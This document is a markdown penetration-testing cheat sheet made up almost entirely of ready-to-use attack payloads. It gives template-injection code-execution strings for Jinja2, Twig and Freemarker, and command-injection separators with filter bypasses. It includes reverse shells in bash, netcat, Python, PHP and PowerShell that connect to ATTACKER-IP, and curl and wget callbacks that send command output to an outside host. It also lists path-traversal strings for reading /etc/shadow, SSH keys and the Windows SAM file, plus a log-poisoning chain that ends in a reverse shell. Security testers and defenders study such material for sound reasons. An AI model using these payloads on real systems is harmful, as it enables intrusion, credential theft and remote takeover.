# SSTI — Server-Side Template Injection

> **Authorized use only.**

## Detection Tree

Inject `{{7*7}}` and look for `49` in the response:

```
{{7*7}}  →  49  ?
├── YES → Jinja2 / Twig / Pebble
│   └── {{7*'7'}}  →  7777777 ? → Jinja2 (Python)
│                  →  49      ? → Twig (PHP)
└── NO → ${7*7}  →  49 ?
         ├── YES → Freemarker / Groovy (Java)
         └── NO  → #{7*7}  →  49 ?
                   ├── YES → Ruby ERB
                   └── NO  → Not SSTI or unknown engine
```

---

## Jinja2 — Python / Flask / Django

**When to use:** Python web apps (Flask, Django with Jinja2)

```python
# Detection
{{7*7}}
{{7*'7'}}   → 7777777 (Jinja2 confirmation)

# Read files
{{''.__class__.__mro__[1].__subclasses__()[40]('/etc/passwd').read()}}

# Modern approach — config object
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}

# RCE via subclasses
{{''.__class__.__base__.__subclasses__()}}
{{''.__class__.__base__.__subclasses__()[<index>].__init__.__globals__['__builtins__']['__import__']('os').popen('id').read()}}

# Find the right subclass index (look for subprocess.Popen or catch_warnings)
{% for x in ''.__class__.__base__.__subclasses__() %}
  {% if 'warning' in x.__name__ %}
    {{x()._module.__builtins__['__import__']('os').popen('id').read()}}
  {% endif %}
{% endfor %}

# RCE — cleaner
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}

# If underscores filtered — use request.args
# URL: /?c=import('os').popen('id').read()
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}
```

---

## Twig — PHP / Symfony

```php
# Detection
{{7*7}}  → 49
{{7*'7'}} → 49 (Twig, not Jinja2)

# RCE
{{['id']|filter('system')}}
{{['cat /etc/passwd']|filter('system')}}

# Via _self
{{_self.env.registerUndefinedFilterCallback('exec')}}
{{_self.env.getFilter('id')}}

# Via setHandler
{{_self.env.setCache('ftp://attacker.com')}}{{_self.env.loadTemplate('backdoor')}}
```

---

## Freemarker — Java

```java
# Detection
${7*7}  → 49

# RCE
${"freemarker.template.utility.Execute"?new()("id")}
<#assign ex="freemarker.template.utility.Execute"?new()>
${ex("id")}
${ex("cat /etc/passwd")}
```

---

# Command Injection Payloads

> **Authorized use only.**

## Detection

```bash
# Separators to try
;id
|id
||id
&&id
`id`
$(id)
$((1+1))    # arithmetic — no command execution but confirms eval

# Time-based blind detection
; sleep 5
| sleep 5
&& sleep 5
`sleep 5`
$(sleep 5)
; ping -c 5 127.0.0.1
```

---

## Linux

**When to use:** Target runs Linux/Unix, parameter passed to shell command  
**Risk of detection:** Medium

```bash
# Basic separators
; id
| id
|| id
&& id
`id`
$(id)

# Read files
; cat /etc/passwd
; cat /etc/shadow
; cat /etc/hosts

# Reverse shells
; bash -i >& /dev/tcp/ATTACKER-IP/4444 0>&1
; bash -c 'bash -i >& /dev/tcp/ATTACKER-IP/4444 0>&1'
; nc ATTACKER-IP 4444 -e /bin/bash
; python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER-IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
; php -r '$sock=fsockopen("ATTACKER-IP",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
```

---

## Windows

**When to use:** Target runs Windows IIS / ASP.NET  
**Risk of detection:** Medium

```powershell
# Basic
; whoami
& whoami
| whoami
&& whoami

# Read files
; type C:\Windows\win.ini
; type C:\inetpub\wwwroot\web.config

# Reverse shell
; powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('ATTACKER-IP',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

---

## Blind — Out-of-Band

**When to use:** No output in response — detect via DNS/HTTP callback  
**Risk of detection:** Low

```bash
# DNS — use Burp Collaborator or interactsh
; nslookup YOUR-COLLABORATOR.com
; dig YOUR-COLLABORATOR.com
`nslookup YOUR-COLLABORATOR.com`
$(nslookup YOUR-COLLABORATOR.com)

# HTTP callback
; curl http://YOUR-COLLABORATOR.com/$(whoami)
; wget http://YOUR-COLLABORATOR.com/?u=$(id|base64)
```

---

## Filter Bypass

```bash
# Space bypass
{cat,/etc/passwd}
cat${IFS}/etc/passwd
cat$IFS/etc/passwd
X=$'cat\x20/etc/passwd'&&$X

# Slash bypass
cat ${HOME:0:1}etc${HOME:0:1}passwd
cat $(echo . | tr '.' '/')etc$(echo . | tr '.' '/')passwd

# Blacklist bypass using variables
c=ca;t=t;$c$t /etc/passwd
cmd="cat /etc/passwd";$cmd

# Base64 encoded command
echo "Y2F0IC9ldGMvcGFzc3dk" | base64 -d | bash
$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dk)
```

---

# LFI — Local File Inclusion / Path Traversal

> **Authorized use only.**

## Detection

```
?file=../../../etc/passwd
?page=....//....//....//etc/passwd
?path=/etc/passwd
?include=php://filter/convert.base64-encode/resource=index.php
```

---

## Linux — Common Files

**When to use:** LFI confirmed on Linux target

```
/etc/passwd
/etc/shadow
/etc/hosts
/etc/hostname
/etc/crontab
/proc/self/environ
/proc/self/cmdline
/proc/net/tcp
/var/log/apache2/access.log
/var/log/apache2/error.log
/var/log/nginx/access.log
/var/log/auth.log
/home/USER/.ssh/id_rsa
/home/USER/.ssh/authorized_keys
/var/www/html/config.php
/var/www/html/.env
```

---

## Path Traversal Variants

```
../../../etc/passwd
....//....//....//etc/passwd
..%2f..%2f..%2fetc%2fpasswd
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
..%252f..%252f..%252fetc%252fpasswd    ← double URL encode
..%c0%af..%c0%af..%c0%afetc%c0%afpasswd   ← Unicode
/....//....//....//etc/passwd
```

---

## PHP Wrappers

**When to use:** PHP app with LFI — wrappers can lead to RCE

```php
# Read PHP source code as base64
php://filter/convert.base64-encode/resource=index.php
php://filter/convert.base64-encode/resource=config.php
php://filter/convert.base64-encode/resource=../../config/database.php

# Execute commands via data wrapper (requires allow_url_include=On)
php://input   # send PHP code as POST body
data://text/plain,<?php system('id')?>
data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpPz4=

# RFI (requires allow_url_fopen=On)
?file=http://ATTACKER/shell.php
?file=ftp://ATTACKER/shell.php
```

---

## Log Poisoning → LFI to RCE

**When to use:** LFI + write access to log file (User-Agent poisoning)

```bash
# Step 1 — inject PHP into User-Agent
curl -A "<?php system(\$_GET['cmd']); ?>" http://target.com/

# Step 2 — include the log file
?file=../../../../var/log/apache2/access.log&cmd=id

# Step 3 — get reverse shell
?file=../../../../var/log/apache2/access.log&cmd=bash+-c+'bash+-i+>%26+/dev/tcp/ATTACKER/4444+0>%261'
```

---

## Windows — Common Files

```
C:\Windows\win.ini
C:\Windows\System32\drivers\etc\hosts
C:\inetpub\wwwroot\web.config
C:\Windows\System32\config\SAM
C:\Users\Administrator\Desktop\root.txt
C:\xampp\htdocs\config.php
C:\wamp\www\config.php
```
